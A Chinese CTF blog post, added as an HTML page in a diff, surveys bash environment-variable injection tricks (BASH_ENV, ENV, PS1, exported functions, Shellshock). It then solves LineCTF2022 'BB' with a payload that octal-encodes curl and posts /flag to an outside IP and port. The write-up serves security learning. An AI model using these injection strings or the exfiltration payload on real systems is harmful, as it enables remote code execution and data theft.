@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Xi4nb3i" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      初识环境变量注入 
+      
+      
+    
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.svg">
+    <link rel="icon" href="/images/favicon.svg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto:400,400italic,600|Roboto+Mono" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/common.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+
+
+  
+
+  
+    
+<link rel="stylesheet" href="/css/post.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Xi4nb3i's blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <a href="/">Xi4nb3i</a>
+</div>
+
+
+      <p class="links">
+  
+    <a title="archives" target="" href="/archives/">
+      <i class="iconfont icon-bookmark"></i>
+    </a>
+  
+    <a title="github" target="_blank" href="https://github.com/xianbeil">
+      <i class="iconfont icon-github"></i>
+    </a>
+  
+</p>
+
+
+      <div class="main">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    }
+  };
+</script>
+
+<div class="post">
+  <h3 class="date">
+    Mar 31, 2022
+  </h3>
+  <h1>
+    初识环境变量注入
+  </h1>
+  <div class="content markdown-body">
+    <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>来源于p牛的博客<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>
+<p>一周内两个大ctf都涉及到这个点，做下简单整理。</p>
+<h1 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h1><h2 id="BASH-ENV"><a href="#BASH-ENV" class="headerlink" title="BASH_ENV"></a>BASH_ENV</h2><p>触发命令：</p>
+<p><code>bash</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH_ENV=<span class="string">&#x27;$(curl xxxxx)&#x27;</span></span><br><span class="line">BASH_ENV=<span class="string">&#x27;$(id 1&gt;&amp;2)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h2><p>触发命令：</p>
+<p><code>bash -i -c</code>需要两个参数</p>
+<p><code>sh -i -c</code> 需要两个参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV=<span class="string">&#x27;$(id 1&gt;&amp;2)&#x27;</span> dash -i -c <span class="string">&#x27;echo hello&#x27;</span></span><br><span class="line">ENV=<span class="string">&#x27;$(id 1&gt;&amp;2)&#x27;</span> sh -i -c <span class="string">&quot;echo hello&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="PROMPT-COMMAND"><a href="#PROMPT-COMMAND" class="headerlink" title="PROMPT_COMMAND"></a>PROMPT_COMMAND</h2><p>触发命令</p>
+<p><code>bash</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PROMPT_COMMAND=<span class="string">&#x27;id&#x27;</span> bash</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="PS1"><a href="#PS1" class="headerlink" title="PS1"></a>PS1</h2><p>触发命令</p>
+<p><code>bash</code> 需要交互式shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS1=<span class="string">&#x27;$(id)&#x27;</span> bash</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_myfunc%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;myfunc&#x27;</span></span><br><span class="line"><span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>文中给出了突破centos7的方法，也就是Bash 4.4</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST=() &#123; :; &#125;; <span class="built_in">id</span>;</span><br><span class="line">Bash 4.4以前：<span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&quot;echo hello&quot;</span></span><br><span class="line">Bash 4.4及以上：<span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="LineCTF2022-BB"><a href="#LineCTF2022-BB" class="headerlink" title="[LineCTF2022]BB"></a>[LineCTF2022]BB</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>环境变量注入RCE</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bye</span>(<span class="params"><span class="variable">$s</span>, <span class="variable">$ptn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$ptn</span>, <span class="variable">$s</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">bye</span>(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>) &amp;&amp; <span class="title function_ invoke__">bye</span>(<span class="variable">$v</span>, <span class="string">&quot;/[a-zA-Z]/i&quot;</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>=<span class="subst">&#123;$v&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;imdude&#x27;&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">bye</span>(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里是bash可以尝试用<code>BASH_ENV</code>来注入</p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330201942-1napt67.png" alt="image.png"></p>
+<p>但是这里过滤了所有的字母，可以用八进制绕过。</p>
+<p><a target="_blank" rel="noopener" href="https://twitter.com/DissectMalware/status/1023682809368653826">https://twitter.com/DissectMalware/status/1023682809368653826</a></p>
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330202351-dz5muwd.png" alt="image.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?env[BASH_ENV]=$($<span class="string">&#x27;\143\165\162\154&#x27;</span>%<span class="number">20</span>$<span class="string">&#x27;\61\56\61\61\67\56\61\64\64\56\64\61\72\64\64\64\64&#x27;</span>)</span><br><span class="line">能外带数据，尝试-F把flag带出来</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?env[BASH_ENV]=$($<span class="string">&#x27;\143\165\162\154&#x27;</span>%<span class="number">20</span>$<span class="string">&#x27;\61\56\61\61\67\56\61\64\64\56\64\61\72\64\64\64\64&#x27;</span>%<span class="number">20</span>$<span class="string">&#x27;\55\106&#x27;</span>%<span class="number">20</span>$<span class="string">&#x27;\146\151\154\145\75\100\57\146\154\141\147&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220330205327-2y3i5cn.png" alt="image.png"></p>
+
+  </div>
+  
+    
+      <a id="older" class="blog-nav" href="/2022/03/20/cc3study/">OLDER&nbsp;&gt;</a>
+      
+        
+          <a id="newer" class="blog-nav" href="/2022/03/31/ctfshow%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/">&lt;&nbsp;NEWER</a>
+          
+            
+</div>
+        <div class="footer">
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Copyright © Leedom 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Theme by Leedom | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+
+
+    </div>
+  </body>
+</html>
